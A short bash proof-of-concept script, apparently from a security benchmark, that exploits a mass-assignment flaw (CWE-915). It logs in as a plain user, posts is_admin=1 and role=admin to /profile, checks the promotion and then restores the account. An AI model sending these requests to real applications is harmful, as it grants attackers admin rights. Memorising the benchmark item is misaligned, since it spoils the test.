#!/usr/bin/env bash
# MASSASSIGN-001 (CWE-915): a plain user promotes themselves by posting
# is_admin=1 to /profile (User model has $guarded = []). Self-restoring.
set -eu
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
post /profile --data-urlencode "name=Acme User" -d "is_admin=1" -d "role=admin" >/dev/null
ADMIN=$(user_admin user1@bench.local)
# restore seed state so later PoCs still see user1 as a plain user
post /profile --data-urlencode "name=Acme User" -d "is_admin=0" -d "role=user" >/dev/null
[ "$ADMIN" = "True" ]
